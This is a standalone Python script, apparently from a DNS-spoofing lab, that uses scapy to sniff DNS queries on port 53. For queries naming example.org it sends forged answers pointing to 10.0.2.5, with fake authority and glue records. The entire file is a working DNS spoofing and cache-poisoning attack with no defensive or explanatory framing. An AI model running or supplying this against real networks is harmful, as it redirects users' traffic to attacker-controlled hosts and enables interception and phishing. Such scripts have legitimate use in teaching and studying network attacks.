#!/usr/bin/python

from scapy.all import *

# DNS spoofing function
def spoof_dns(pkt):
    # Check if the packet contains DNS query and is requesting 'example.org'
    if (DNS in pkt and b'example.org' in pkt[DNS].qd.qname):
        # Change the IP (swap src and dst for spoofed response)
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        
        # Change the UDP port (swap src and dst ports)
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
        
        # Construct DNS answer (pointing 'example.org' to 10.0.2.5)
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='10.0.2.5')
        
        # Construct DNS authority section (NS records for example.org)
        NSsec1 = DNSRR(rrname='example.org', type='NS', ttl=259200, rdata='ns1.example.com')
        NSsec2 = DNSRR(rrname='example.org', type='NS', ttl=259200, rdata='ns2.example.com')
        
        # Construct DNS additional section (IP addresses for the NS records)
        Addsec1 = DNSRR(rrname='ns1.example.com', type='A', ttl=259200, rdata='1.2.3.4')
        Addsec2 = DNSRR(rrname='ns2.example.com', type='A', ttl=259200, rdata='5.6.7.8')
        
        # Assemble the spoofed DNS response packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, 
                     qdcount=1, ancount=1, nscount=2, arcount=2,
                     an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)
        
        # Construct the complete spoofed packet
        spoofpkt = IPpkt / UDPpkt / DNSpkt
        
        # Send the spoofed packet
        send(spoofpkt)
        print("Spoofed DNS response sent")

# Sniff UDP query packets on port 53 and invoke spoof_dns() when a packet is detected
pkt = sniff(filter="udp and dst port 53", prn=spoof_dns)
